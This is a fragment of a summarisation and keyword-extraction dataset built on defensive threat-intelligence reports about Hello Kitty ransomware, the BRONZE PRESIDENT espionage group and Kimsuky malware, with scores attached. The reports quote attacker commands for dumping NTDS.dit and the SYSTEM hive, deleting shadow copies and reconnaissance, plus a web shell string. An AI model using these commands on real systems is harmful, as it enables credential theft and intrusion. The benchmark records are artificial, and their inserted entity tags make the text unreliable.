illicit activities . Paying the ransom also does not guarantee a victim \u2019s files will be recovered . However , the [ORG] FBI understands when businesses are faced with an inability to function , executives will evaluate all options to protect their shareholders , employees , and customers . Regardless of whether you or your organization decides to pay the ransom , the [ORG] FBI urges you to report ransomware incidents to your local field office . Doing so provides investigators and analysts with the critical information they need to track ransomware attackers , hold them accountable under [GPE] US law , and prevent future attacks . The [ORG] FBI may seek the following information : [ORG] IP addresses identified as malicious or [ORG] suspicious\uf0b7 Recovered executable files [CARDINAL] \uf0b7 Live memory ( [ORG] RAM ) capture [CARDINAL] \uf0b7 Images of infected systems [CARDINAL] \uf0b7 Email addresses of the attackers \uf0b7 A copy of the ransom note [CARDINAL] \uf0b7 [ORG] Ransom amount [CARDINAL] \uf0b7 Bitcoin wallets used by the attackers [CARDINAL] \uf0b7 Bitcoin wallets used to pay the ransom \uf0b7 Post - incident forensic reportsRecommended Mitigations \uf0b7 Back - up critical data offline . [CARDINAL] \uf0b7 [ORG] Ensure copies of critical data are in the cloud or on an external hard drive orstorage device.\uf0b7 Secure your back - ups and ensure all data is not accessible for modification ordeletion from the system where the data resides . TLP : WHITETLP : WHITE /\uf0b7 Use [CARDINAL] two - factor authentication with strong passwords , including for remoteaccess services.\uf0b7 Monitor cyber threat reporting regarding the publication of compromised [ORG] VPNlogin credentials and change passwords and settings , if [GPE] applicable.\uf0b7 [GPE] Keep computers , devices , and applications patched and up - to - date . [PRODUCT] \uf0b7 [PRODUCT] \uf0b7 [PRODUCT] Review the following additional resources : Install and regularly update anti - virus or anti - malware software on all hosts.o CISA \u2019s analysis report and malware analysis report on [ORG] FiveHandsransomware provide analysis of a threat actor \u2019s tactics , techniques , and procedures used in a successful cyberattack ; indicators of compromise ; and recommended mitigations to protect against , detect , and respond to potential [ORG] FiveHands ransomware attacks.o The joint advisory from [GPE] Australia , [GPE] Canada , [GPE] New [GPE] Zealand , the [ORG] UnitedKingdom , and [GPE] the [GPE] United [GPE] States on Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.o The Cybersecurity and Infrastructure Security Agency - Multi - StateInformation Sharing & Analysis Center Joint Ransomware Guide covers additional best practices and ways to prevent , protect , and respond to a ransomware [PERSON] attack.o [PERSON] StopRansomware.gov is [ORG] the [ORG] US Government \u2019s official [CARDINAL] one - stop location forresources to tackle ransomware more effectively . If your organization is impacted by a ransomware incident , the [ORG] FBI and [ORG] CISA recommend the following [GPE] actions:\uf0b7Isolate the infected system . Remove the infected system from all networks , and disable the computer \u2019s networking capabilities , including wireless and Bluetooth . Ensure all shared and networked drives are disconnected , whether wired or wireless.\uf0b7 Turn off other computers and devices . Power - off and segregate ( i.e. , removefrom the network ) the infected computer(s ) . Power - off and segregate any additional computers or devices that share a network with the infected computer(s ) , even if they have not been fully encrypted by ransomware . If possible , collect and secure all infected and potentially infected computers [PERSON] andTLP : WHITETLP : WHITE /devices in a central location , making sure to clearly label any computers that have been encrypted . Powering - off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists.\uf0b7 Secure your backups . Ensure that your backup data is offline and secured . Ifpossible , scan your backup data with an antivirus program to check that it is free of malware . TLP : WHITEReporting NoticeThe [ORG] FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local [ORG] FBI field office . With regards to specific information that appears in this communication ; the context , individual indicators , particularly those of a non- deterministic or ephemeral nature ( such as filenames or [ORG] IP addresses ) , may not be indicative of a compromise . Indicators should always be evaluated in light of your complete information [GPE] Field office contacts can be identified at www.fbi.gov/contact-us/field-offices . When available , each report submitted should include the date , time , location , type of activity , number of people , and type of equipment used for the activity , the name of the submitting company or organization , and a designated point of contact . Administrative Note This product is marked TLP : WHITE . Subject to standard copyright rules , the information in this product may be shared without restriction . Your Feedback Regarding this Product is [ORG] CriticalWas this product of value to your organization ? Was the content clear and concise ? Your comments are very important to us and can be submitted anonymously . Please take a moment to complete the survey at the link below . Feedback should be specific to your experience with our written products to enable the [ORG] FBI to make quick and continuous improvements to such products . Feedback may be submitted online here : url Please note that this survey is for feedback on content and value only . Reporting of technical information regarding FLASH reports must be submitted through [ORG] FBI CYWATCH .", "generated_text": "the FBI; information; alerts; cyber threats; victims; Hello Kitty/FiveHands ransomware; January 2021; the threat actors; malicious infrastructure; compromised credentials; compromised capabilities; SonicWall products; Cobalt Strike; PowerShell Empire; Mimikatz; the network; privileges; exfiltration; the ransom; their ability; the ransom; Bitcoin; a ransom payment; Bitpay; businesses; a cyber security campaign; a ransom note; a threat actor; the threat actor; training; employees; customers; support; the FBI; threat intelligence; access.", "ref_text": "<START-1>Here is a summary of the key points. The FBI first observed the Hello Kitty/FiveHands ransomware in January 2021. The group uses aggressive extortion tactics, including DDoS attacks and data theft/exposure. The report provides technical details on the group's tactics, techniques, and procedures. The report includes specific IOCs associated with the group's malware samples and infrastructure. Recommended mitigations focus on backup procedures, MFA, patching, AV software, and isolating/turning off infected systems. The FBI urges ransomware victims to report incidents to provide info needed to track the attackers. Feedback on the value of the report is also requested. Overall, the Flash provides a profile of the Hello Kitty/FiveHands ransomware operation, including its cyber extortion methods and technical capabilities, to inform potential targets and guide incident response.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4021447721179625, "gpt3/lexical/rouge_rouge2": 0.11859838274932614, "gpt3/lexical/rouge_rougeL": 0.23056300268096513, "gpt3/lexical/rouge_rougeLsum": 0.23056300268096513, "gpt3_generated_text": ["The article, provided by the FBI, alerts recipients to the presence of the Hello Kitty/FiveHands ransomware and provides information to help protect against cyber threats. The FBI first observed this ransomware in January 2021 and notes that the threat actors behind it use aggressive tactics, including the double extortion technique and launching Distributed Denial of Service (DDoS) attacks. The threat actors demand ransom payments in Bitcoin, tailored to each victim's assessed ability to pay. If no ransom is paid, the threat actors may post victim data on the Babuk site or sell it to a third-party data broker. The ransomware exploits compromised credentials or known vulnerabilities in SonicWall products and uses penetration tools such as Cobalt Strike, Commando, and PowerShell Empire to map the network and escalate privileges. The FBI advises against paying the ransom, but understands that businesses may evaluate all options to protect themselves. Regardless of whether the ransom is paid or not, the FBI urges reporting ransomware incidents to local field offices, as it provides critical information to track and hold attackers accountable. The FBI may seek various information such as IP addresses, executable files, live memory captures, images of infected systems, email addresses of attackers, ransom notes, ransom amounts, and Bitcoin wallets. The article also provides recommended mitigations including backing up critical data offline, using two-factor authentication, monitoring cyber threat reporting, keeping systems patched and updated, and installing anti-virus or anti-malware software."]}, {"split_name": "val", "sample_id": "val_37", "prompt_text": "Extract the keywords: [CARDINAL] 1/6/2020BRONZE PRESIDENT Targets NGOs | SecureworksBRONZE PRESIDENT Targets NGOssecureworks.com/research/bronze-president-targets-ngosSummary The activities of some non - governmental organizations ( NGOs ) challenge governments on politically sensitive issues such as social , humanitarian , and environmental policies . As a result , these organizations are often exposed to increased government - directed threats aimed at monitoring their activities , discrediting their work , or stealing their intellectual property . BRONZE PRESIDENT is a likely People 's [GPE] Republic [GPE] of [GPE] China ( PRC)-based targeted cyberespionage group that uses both proprietary and publicly available tools to target NGO networks . Secureworks \u00ae [ORG] Counter [ORG] Threat [ORG] Unit \u2122 ( CTU ) researchers have observed [ORG] BRONZE PRESIDENT activity since [DATE] mid-2018 but identi\ufb01ed artifacts suggesting that the threat actors may have been conducting network intrusions as far back as 2014.CTU \u2122 researchers divided the threat intelligence about this threat group into [CARDINAL] two sections : strategic and tactical . Executives can use the strategic assessment of the ongoing threat to determine how to reduce risk to their organization 's mission and critical assets . Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group 's activities . Key pointsThe [ORG] BRONZE PRESIDENT cyberespionage group targets NGOs , as well as political and law enforcement organizations in countries in [LOC] South and [LOC] East [LOC] Asia . The threat group appears to have developed its own remote access tools that it uses alongside publicly available remote access and post - compromise toolsets . After compromising a network , the threat actors elevate their privileges and install malware on a large proportion of systems . The group runs custom batch scripts to collect speci\ufb01c \ufb01le types and takes proactive steps to minimize detection of its activities . Strategic threat intelligence Analysis of a threat group 's targeting , origin , and competencies can determine which organizations could be at risk . This information can help organizations make strategic defensive decisions in relation to the [ORG] BRONZE PRESIDENT threat group . Intent CTU researchers have observed [ORG] BRONZE PRESIDENT targeting multiple NGOs . The threat actors steal data from compromised systems over a long period of time , which likely indicates a long - term objective of monitoring the target 's network . [ORG] BRONZE PRESIDENT uses custom batch scripts to collect either speci\ufb01c \ufb01le types ( including \ufb01les with .pptx , .xlsx , .pdf extensions ) or allurl PRESIDENT Targets NGOs | Secureworks\ufb01les within a speci\ufb01c location . CTU researchers also observed evidence that the threat actors collect credentials from high - privilege network accounts and reputationally sensitive accounts , such as social media and webmail accounts . Additionally , CTU researchers have observed evidence of [ORG] BRONZE PRESIDENT targeting political and law enforcement organizations in countries adjacent to the [GPE] PRC , including [GPE] Mongolia and [GPE] India . Some of the group 's phishing lures suggest an interest in national security , humanitarian , and law enforcement organizations in the [LOC] East , [LOC] South , and [LOC] Southeast [LOC] Asia ( see Figure [CARDINAL] 1 ) . These examples reveal BRONZE PRESIDENT 's likely intent to conduct political espionage in other countries in addition to targeting NGOs . Figure [CARDINAL] 1 . [DATE] August [DATE] 2019 phishing lure referencing [NORP] Mongolian national security topics . ( Source : It is highly likely that [ORG] BRONZE PRESIDENT is based in the [GPE] PRC due to the following observations : url PRESIDENT Targets NGOs | [GPE] SecureworksThe NGOs targeted by [ORG] BRONZE PRESIDENT conduct research on issues relevant to the [GPE] PRC . Strong evidence links BRONZE PRESIDENT 's infrastructure to entities within the [GPE] PRC . There are connections between a subset of the group 's operational infrastructure and [ORG] PRC- based Internet service providers . Tools such as PlugX have historically been leveraged by threat groups operating in the [PERSON] PRC.It is likely that [ORG] BRONZE PRESIDENT is sponsored or at least tolerated by the [GPE] PRC government . The threat group 's systemic long - term targeting of NGO and political networks does not align with patriotic or criminal threat groups . Capability BRONZE PRESIDENT has deployed a variety of remote access tools . The use of tools not previously observed by CTU researchers suggests that the group could have access to malware development capabilities . BRONZE PRESIDENT also uses widely available or modi\ufb01ed open- source tools , which could be a strategic effort to reduce the risk of attribution or to minimize the need for tool development resources . Following a network compromise , the threat actors typically delete their tools and processes . However , the group is content leaving some malware on the network , likely to provide a contingency if other access channels are removed . When the group 's activities were detected in [CARDINAL] one incident , it had elevated privileges and had maintained access to the targeted environment for [DATE] several [DATE] months . This \ufb01nding indicates the group 's effectiveness at maintaining long - term access to a targeted network . Tactical threat intelligence Incident response engagements have given CTU researchers insight into the threat group 's tools CTU researchers and Secureworks incident responders have observed [ORG] BRONZE PRESIDENT using the following tools , along with several custom batch scripts for locating and archiving speci\ufb01c \ufb01le types : Cobalt Strike \u2014 This popular and commercially available penetration tool gains shell access to an infected system . It allows threat actors to execute additional tools and perform post - intrusion actions on compromised systems . Cobalt Strike appears to be one of [ORG] BRONZE PRESIDENT 's preferred remote access tools . During [CARDINAL] one intrusion , the threat actors installed it on [PERCENT] over 70 % of accessible hosts . The group 's Cobalt Strike installation typically uses a payload named svchost.exe in an attempt to disguise Cobalt Strike activity as the legitimate [PRODUCT] Windows svchost.exe executable.url PRESIDENT Targets NGOs | SecureworksPlugX \u2014 This remote access trojan ( RAT ) is popular among [GPE] PRC - based targeted threat groups . Its functionality includes uploading and downloading \ufb01les , and it has con\ufb01gurable network protocols . BRONZE PRESIDENT installs PlugX using [ORG] DLL side - loading . In [DATE] June and [DATE] August [DATE] 2019 , [ORG] BRONZE PRESIDENT delivered PlugX via government and law enforcement - themed phishing lures . ORat \u2014 CTU researchers have only observed this basic loader tool in the context of [ORG] BRONZE PRESIDENT intrusions . ORat is the name assigned by the malware author , as denoted by the program debug database string in the analyzed sample : [PERSON] D:\\vswork\\Plugin\\ORat\\build\\Release\\ORatServer\\Loader.pdb . The tool uses [ORG] the [ORG] Windows [ORG] Management [ORG] Instrumentation ( WMI ) event consumer for persistence by installing a script to the system 's [ORG] WMI registry . Messages sent from ORat to its command and control ( C2 ) server start with the string \" VIEWS0018x \" . If the data received from the [CARDINAL] C2 server starts with the same string , then the remainder of the payload is decompressed using ORat 's \" de\ufb02ate \" algorithm and called as a function . ORat acts as a \ufb02exible loader tool rather than a fully featured remote access tool . RCSession \u2014 This basic [ORG] RAT is installed via [ORG] DLL side - loading , and CTU researchers observed [ORG] BRONZE PRESIDENT installing it on multiple hosts during intrusions . RCSession was extracted from a \ufb01le called [ORG] English.rtf and launched via a hollowed svchost.exe process . [ORG] RCSession connects to its [CARDINAL] C2 server via a custom protocol , can remotely execute commands , and can launch additional tools . CTU researchers have no evidence of other threat actors using [ORG] RCSession or of wide proliferation of the tool , suggesting it may be exclusively used by [ORG] BRONZE PRESIDENT . [NORP] Nbtscan \u2014 This publicly available command - line tool scans systems for [ORG] NetBIOS name information ( see Figure [CARDINAL] 2 ) . In an example observed by CTU researchers , the [NORP] Nbtscan executable was named [GPE] Adobe.exe and was installed in several working directories on compromised hosts , including : C:\\Recovery\\.Figure [CARDINAL] 2 . [NORP] Nbtscan being used via [ORG] RCSession to scan an internal [ORG] IP range . ( Source : Secureworks ) Nmap \u2014 BRONZE PRESIDENT used this freely available network scanning tool from the [ORDINAL] C:\\PerfLogs\\ folder . Wmiexec \u2014 This publicly available tool uses WMI to create SYSTEM - level shells on remote hosts . Links to other malware While analyzing hosts compromised by [ORG] BRONZE PRESIDENT , CTU researchers identi\ufb01ed other malware artifacts . Although there was no evidence of the group using the malware , the threat actors may have leveraged its access or capabilities during earlier phases of the intrusions . Theurl PRESIDENT Targets NGOs | SecureworksBRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over [DATE] several [DATE] months [DATE] or [DATE] years . [ORG] China [ORG] Chopper web shell \ufb01les named error404.aspx included the \" eval(Request . Item[\"|\"],\"unsafe \" ) ; \" string . To successfully interact with the web shell , a threat actor sent HTTP requests that included the \" | \" parameter . The web shell \ufb01les appeared to be installed during the timeframe that [ORG] BRONZE PRESIDENT was active on the system ( see Figure 3).Figure [CARDINAL] 3 . Timeline of malicious tool use on a compromised host . ( Source : Secureworks)CTU researchers identi\ufb01ed a variety of post - compromise tools stored under % AppData% ( e.g. , \\AppData\\Roaming\\Temp ) on several compromised systems . The widespread proliferation and use of the following tools suggest that the group likely has the knowledge and capability to use them as part of its operations : Powerview.ps1 \u2014 This [ORG] PowerShell - based module for network reconnaissance is part of the [ORG] PowerSploit penetration testing framework . PVE Find AD User \u2014 This command - line tool identi\ufb01es login locations of [WORK_OF_ART] Active [WORK_OF_ART] Directory ( AD ) users . AdFind \u2014 This command - line tool conducts AD queries . NetSess \u2014 This publicly available tool enumerates [NORP] NetBIOS sessions . Netview \u2014 This tool enumerates networks . TeamViewer \u2014 This remote control and desktop - sharing tool has applications for legitimate and malicious system users . Its installation in a temporary directory alongside network reconnaissance and enumeration tools likely indicates malicious intent . Initial access and working directories At the time of detection , observed [ORG] BRONZE PRESIDENT incidents had likely been ongoing for [DATE] several [DATE] months [DATE] or [DATE] even [DATE] years . As a result , CTU researchers were unable to ascertain the initial access vector . In [DATE] October [DATE] 2019 , [ORDINAL] third - party researchers described a phishing campaign that usedurl PRESIDENT Targets NGOs | SecureworksC2 infrastructure that CTU researchers attribute to [ORG] BRONZE PRESIDENT . This connection suggests that the group uses phishing emails with ZIP attachments that contain [ORG] LNK \ufb01les as an initial access vector . During [CARDINAL] one intrusion , the threat actors gained administrator access to all systems within a targeted business unit and installed their remote access tools on [PERCENT] 80 % of the hosts . The group installed multiple tools within the environment , including [CARDINAL] three different tools on a strategically important server , likely to provide contingency access options ( see [LAW] Table [LAW] 1).Cobalt Strike RCSession ORat Host 1 ( Server ) Host 2 ( [ORG] User PC ) X Host 3 ( [ORG] User PC ) X Host 4 ( User PC ) [DATE] Host [DATE] 5 ( User PC ) Host 6 ( User PC ) X Host 7 ( User PC ) XX XXTable 1 . Remote access tools identi\ufb01ed on infected hosts during a [ORG] BRONZE PRESIDENT intrusion . BRONZE PRESIDENT used multiple directories to install tools on compromised hosts ( see [LAW] Table [LAW] 2).Associated tool C:\\Windows\\Help\\Help\\ C:\\Windows\\debug\\WIA\\ Cobalt Strike C:\\Windows\\Logs\\DPX\\ NbtscanTable 2 . Directories used by [ORG] BRONZE PRESIDENT to execute or store tools . Network enumeration , lateral movement , and credential accessurl PRESIDENT Targets NGOs | SecureworksDuring multiple intrusions , the threat actors employed various tools and techniques to understand the network environments . For example , they used [ORG] Nmap to scan various internal [ORG] IP address ranges and [ORG] SMB ports ( see Figure [CARDINAL] 4 ) . They also relied on [NORP] Nbtscan , net user , and ping commands to obtain insights and identify opportunities for lateral movement . Figure [CARDINAL] 4 . Nmap network scanning tool use via [ORG] RCSession . ( Source : Secureworks)BRONZE PRESIDENT regularly leverages [PERSON] Wmiexec to move laterally . During [CARDINAL] one intrusion , the threat actors extensively used this tool to execute [ORG] WMI commands on remote hosts in the environment ( see Figure [CARDINAL] 5).Figure 5 . Wmiexec used to execute commands on a targeted host . ( Source : Secureworks)They also frequently leverage net commands to connect to other hosts ( see Figure [CARDINAL] 6 ) using compromised credentials collected during early phases of the intrusion . Figure [CARDINAL] 6 . BRONZE PRESIDENT [NORP] Nbtscan use and net commands . ( Source : Secureworks)During [CARDINAL] one intrusion observed by CTU researchers , the group used the native vssadmin tool on a domain controller to create a volume shadow copy : vssadmin create shadow /for = c : The threat actors retrieved the NTDS.dit \ufb01le from the volume shadow copy . [GPE] NTDS.dit contains [ORG] Active [ORG] Directory data , including password hashes for all users on a domain . Extracting hashes from the NTDS.dit \ufb01le requires access to the SYSTEM \ufb01le in the system registry : reg save hklm\\system c:\\windows\\temp\\system.hiveurl PRESIDENT Targets NGOs | [ORG] SecureworksThe threat actors saved both the SYSTEM \ufb01le ( system.hive ) and NTDS.dit in the compromised host 's c:\\windows\\temp directory . These \ufb01les were likely ex\ufb01ltrated and exploited of\ufb02ine to retrieve user password hashes , which could then be cracked or used to perform pass - the - hash attacks . [CARDINAL] C2 communications and infrastructure BRONZE PRESIDENT 's C2 techniques are dictated by its remote access tools . The group 's primary and likely proprietary [ORG] RCSession RAT communicates with a hard - coded [CARDINAL] C2 server using a custom protocol over [ORG] TCP port [CARDINAL] 443 . After connecting to its [CARDINAL] C2 server , [ORG] RCSession checks in with an encrypted beacon and then awaits instruction . The ORat tool , which appears to be used less frequently by the group , communicates over [ORG] TCP port [CARDINAL] 80 using a raw socket protocol ( not HTTP).The Cobalt Strike tool has malleable [CARDINAL] C2 pro\ufb01les . During [CARDINAL] one intrusion , it connected to multiple C2 domains on [ORG] TCP port [CARDINAL] 80 , including mail . svrchost . com , using the following request . Subsequent Cobalt Strike C2 servers included subdomains of svchosts . com , svrchost . com , and strust . club . GET /Dv9i HTTP/1.1 User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [EVENT] Windows [EVENT] NT [EVENT] 5.1 ; Trident/4.0 ) Host : mail . svrchost . com Connection : Keep - Alive Cache - Control : no - cacheSome BRONZE PRESIDENT [CARDINAL] C2 domains analyzed by CTU researchers were hosted on infrastructure owned by [NORP] Dutch VPS provider Host Sailor , [GPE] Hong [GPE] Kong - based [ORG] New [ORG] World [ORG] Telecoms , and [GPE] Malaysia - based [ORG] Shinjiru [ORG] Technology ( see Figure [CARDINAL] 7 ) . The threat actors have used discrete infrastructure clusters that share matching hosting and registration characteristics . The pattern of infrastructure hosting suggests that the group parks its domains when not in use , an operational security technique that limits exposure of the group 's overall hosting infrastructure . Figure [CARDINAL] 7 . Hosting for a subset of [ORG] BRONZE PRESIDENT [CARDINAL] C2 domains . ( Source : [NORP] Secureworks)url PRESIDENT Targets NGOs | [ORG] SecureworksPersistence , defensive evasion , and ex\ufb01ltration Some of BRONZE PRESIDENT 's malware has persistence capabilities . For example , ORat uses a WMI event consumer to maintain its presence on a compromised host . The group also creates and maintains scheduled tasks to achieve this purpose . Figure [CARDINAL] 8 shows a Sysdriver scheduled task that periodically executes a Cobalt Strike payload . Figure [CARDINAL] 8 . BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence . ( Source : Secureworks)The threat actors tend to install malware on a large proportion of hosts during their intrusions . However , the group exercises restraint and defensive evasion tactics to minimize opportunities for network defenders to detect or investigate its activities . For example , the threat actors deleted volume shadow copies after using them for NTDS.dit retrieval : vssadmin delete shadows /for = c : /quietLikewise , the group demonstrated diligence by killing local and remote processes after they had been used : taskkill /im svchosts.exe /Ftaskkill /S < REMOTE SYSTEM NAME > /U < USERNAME > /P < PASSWORD > /im svchost.exeBRONZE PRESIDENT targets speci\ufb01c data types . The threat actors use custom batch scripts to create a list of \ufb01les with prede\ufb01ned criteria and collate the identi\ufb01ed \ufb01les into a .rar archive ( see Figure [CARDINAL] 9 ) . CTU researchers have observed [ORG] BRONZE PRESIDENT batch scripts named doc.bat , xls.bat , [PERSON] xlsx.bat , ppt.bat , pptx.bat , pdf.bat , and txt.bat.url PRESIDENT Targets NGOs | SecureworksFigure 9 . [PERSON] Batch script ( pptx.bat ) used to collate and archive all .pptx \ufb01les in a de\ufb01ned location . ( Source : Secureworks)The group also uses the all.bat batch script to collect all \ufb01les stored on a speci\ufb01c user 's desktop . CTU researchers observed [ORG] RCSession and Cobalt Strike on systems that [ORG] BRONZE PRESIDENT targeted for data theft . Either of these tools could have been used to ex\ufb01ltrate the archived data . Conclusion BRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such as [PERSON] Cobalt [PERSON] Strike , PlugX , ORat , and [ORG] RCSession . The concurrent use of so many tools during a single intrusion suggests that the group could include threat actors with distinct tactics , roles , and tool preferences . It is likely that [ORG] BRONZE PRESIDENT has additional unobserved operational tools and capabilities . CTU researchers recommend that organizations apply controls to mitigate common intrusion techniques and behaviors along with controls that address the tools and techniques discussed in this analysis . Threat indicators The threat indicators in Table 3 are associated with [ORG] BRONZE PRESIDENT threat campaigns . Note that [ORG] IP addresses can be reallocated . The [ORG] IP address and domains may contain malicious content , so consider the risks before opening them in a browser . Indicator PlugX C2 serverurl PRESIDENT Targets NGOs | SecureworksIndicator RCSession C2 serverORat and Cobalt Strike C2 server Cobalt Strike C2 server Cobalt Strike C2 server Cobalt Strike down\u2010 load location Used by [ORG] BRONZE PRESIDENT to check a compromised sys\u2010 tem 's connectivity [PERSON] Linked to BRONZE Linked to BRONZE Linked to [ORG] BRONZE sampleCobalt [PERSON] Strike payloadCobalt Strike payloadurl PRESIDENT Targets NGOs | SecureworksIndicator Cobalt Strike payloadCobalt [PERSON] Strike payloadCobalt [PERSON] Strike payloadCobalt [PERSON] Strike payloadCobalt [PERSON] Strike payloadModi\ufb01ed [ORG] DLL \ufb01le ( goopdate.dll ) used by [ORG] BRONZE PRESI\u2010 DENT to install [PERSON] RCSession [PERSON] Modi\ufb01ed [PERSON] DLL \ufb01le ( goopdate.dll ) used by [ORG] BRONZE PRESI\u2010 DENT to install [PERSON] RCSession [PERSON] Modi\ufb01ed [PERSON] DLL \ufb01le ( goopdate.dll ) used by [ORG] BRONZE PRESI\u2010 DENT to install Modi\ufb01ed DLL \ufb01le ( goopdate.dll ) used by [ORG] BRONZE PRESI\u2010 DENT to install [ORG] RCSessionurl PRESIDENT Targets NGOs | SecureworksIndicator NATIONAL SECURITY CONCEPT OF Modi\ufb01ed DLL \ufb01le ( goopdate.dll ) used by [ORG] BRONZE PRESI\u2010 DENT to install [PERSON] RCSession [PERSON] Modi\ufb01ed [PERSON] DLL \ufb01le ( goopdate.dll ) used by [ORG] BRONZE PRESI\u2010 DENT to install [PERSON] DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure delivering [ORG] PlugXurl PRESIDENT Targets NGOs | SecureworksIndicator DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure [PERSON] DENT phishing lure delivering PlugXTable [CARDINAL] 3 . BRONZE PRESIDENT indicators.url", "generated_text": "PDF; BRONZE PRESIDENT; cyberespionage; organizations; South; East Asia; use; remote access; tools; proprietary; publicly available tools; NGO networks; the threat actors; the group; remote access; malware; a large proportion; systems; custom batch scripts; specific file types; detection; the group; credentials; credentials; social media; webmail accounts; Mongolia; India; the group; the infrastructure; connections; PRC-based Internet service providers; PlugX; the investigation; analysis; organizations; objectives; the group; organizations; research.", "ref_text": "<START-1>The PDF details the activities of a likely China-based cyberespionage threat group named BRONZE PRESIDENT that targets non-governmental organizations (NGOs), political groups, and law enforcement agencies, primarily in South and East Asia. The group has been active since at least 2014 and uses a variety of custom and publicly available hacking tools to compromise target networks and steal sensitive data. BRONZE PRESIDENT's custom tools include ORat, RCSession, and modified DLL files, while they also leverage Cobalt Strike, PlugX, WMI, and more. BRONZE PRESIDENT uses multiple directories to install tools on compromised hosts and employs various tools and techniques during multiple intrusions to understand network environments. The group gains initial access through phishing and then moves laterally across networks, collects credentials, elevates privileges, and installs tools on a large number of systems. They are adept at maintaining long-term access and have diligent operational security procedures. Some of BRONZE PRESIDENT's malware has persistence capabilities, such as using a WMI event consumer to maintain its presence on a compromised host and creating scheduled tasks to achieve this purpose. Researchers detail BRONZE PRESIDENT's tactics, malware, infrastructure, targeting, and provide indicators of compromise to help network defenders combat this threat. The report concludes that organizations should apply controls to mitigate common intrusion techniques the group leverages. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5558086560364465, "gpt3/lexical/rouge_rouge2": 0.18764302059496568, "gpt3/lexical/rouge_rougeL": 0.2733485193621868, "gpt3/lexical/rouge_rougeLsum": 0.2733485193621868, "gpt3_generated_text": ["The article discusses the activities of a cyberespionage group known as BRONZE PRESIDENT, which primarily targets non-governmental organizations (NGOs) in South and East Asia. The group utilizes a combination of proprietary and publicly available tools, including remote access tools, to infiltrate NGO networks. Once inside, the threat actors elevate their privileges and install malware on a large number of systems. They also use custom batch scripts to collect specific file types and credentials from high-privilege network accounts. The group has been observed targeting political and law enforcement organizations in countries adjacent to the People's Republic of China (PRC), such as Mongolia and India. The article suggests that BRONZE PRESIDENT may be based in the PRC due to connections between its infrastructure and PRC-based internet service providers. The group's long-term targeting of NGO and political networks indicates a likely sponsorship or tolerance by the PRC government. BRONZE PRESIDENT has demonstrated access to malware development capabilities and also employs widely available or modified open-source tools to minimize the risk of attribution. Despite deleting their tools and processes after a network compromise, the group often leaves some malware behind as a contingency. Overall, the article highlights the strategic and tactical threat intelligence gathered on BRONZE PRESIDENT to help organizations reduce the risk to their mission and critical assets."]}, {"split_name": "val", "sample_id": "val_38", "prompt_text": "Extract the keywords: Piece of dragon 's scalessfkino-tistory-com.translate.goog/80TL;DRDecember [CARDINAL] 30 , [CARDINAL] 2021Attacks using the golddragon / braveprince cluster of the kimsuky ( aka [GPE] Thallium ) group continue Recently , a routine to encode API names has been added to the golddragon / braveprince cluster malware . Quasar - based malware , an open source [ORG] RAT , was discovered by searching for additional intelligence based on stringsoutline In fact , the golddragon / braveprince clusters ( personally , I call them daumrat ) were thinking of posting them all around mid- 2021 While I was spending time in the lost arc , the cisco talos team organized it well and made it public . It 's sweet , but thanks to you , I have no use for it . So , in this post , we will briefly discuss the braveprince , password stealer malware , and Quarsar RAT - based .net malware with name en / decoding routine added through intelligence search . Case [CARDINAL] 1 . [ORG] Golddragon / braveprince malware with API Name En / Decoding logic addedWhen the [PERSON] Run function is executed through rundll.exe , it is a very typical braveprince cluster that steals information and creates svchost.exe and iexplorer.exe to steal information via daum mail . ( Personally , I call it daumrat ) recently discovered golddragon / braveprince In the malware , functions were the same as before , but we found a sample with added logic to encrypt / decrypt [ORG] DLL and API names . WTF_10003CD0 functionget encoded dll name & api name Inside the file , there is an api_name_table containing the encoded [ORG] DLL name and the API included in the [ORG] DLL . Get the encoded [ORG] DLL name by comparing the encoded api names in this table.1/14decode string The encoded [ORG] DLL and API names received as arguments are decoded by the following routine.1 . Get the index of the character position to be decrypted in the key table [CARDINAL] 2 . Calculate the position index value with a specific formula ( ( idx - 0x16 ) & [CARDINAL] 0x3F ) [CARDINAL] 3 . Replace the encoded string using the calculated value as an index in the key tableThe decryption logic is implemented as follows.def decryptor(enc_str):key_table = ' zcgXlSWkj314CwaYLvyh0U_odZH8OReKiNIr - JM2G7QAxpnmEVbqP5TuB9Ds6fFt ' dec_str = '' for enc_chr in enc_str : idx = key_table.index(ord(enc_chr ) ) dec_str + = chr(key_table [ ( idx - 0x16 ) & 0x3F ] ) return dec_str2/14The string substitution key table used by this malware is also found in other malware used by this group . ( link : url PebbleDash.pdf ) Case 2 . Information [ORG] StealerReport published by [ORG] AhnlabIn a stranger intelligence search , I found a sample with a familiar scent . It is a sample that has already been analyzed and reported by talos , so let 's briefly look at the functions . ( link : url ) % [NORP] AppData%qwer.txt file does not exist if it does not exist [ORG] Create % AppData%information folder ( WORKING_PATH ) Save system information in % AppData%Information foldercmd.exe /c ipconfig / all > > [ WORKING_PATH]\\netinfo.dat & arp -a > > [ WORKING_PATH]\\netinfo.dat cmd.exe /c systeminfo > > [ WORKING_PATH]\\sysinfo.dat cmd.exe /c tasklist > > [ WORKING_PATH]\\procinfo.dat [ WORKING_PATH]\\filelist.datAfter the svchost.exe process is created , the data in the resource area is decrypted and then injectedIt is a malicious code that modified nirsoft 's webpassview program to steal user information stored in the browser and save it as a file.[WORKING_PATH]\\aaweb.txt3/14Stealing system informationStealing account information stored in web browsersThis malicious code does not have a routine to transmit the collected information to the outside and does not run without the qwer.txt file , so it appears to be one of the system information collection modules executed by other malicious codes . Case [CARDINAL] 3 . .Net malware based on Quasar RATCase 1 While performing an intelligence search with the found key value and encoded API name , I found a dropper running Quasar RAT . The resource structure of the file is quite complex , so I expressed it as a picture4/14The operation method of the 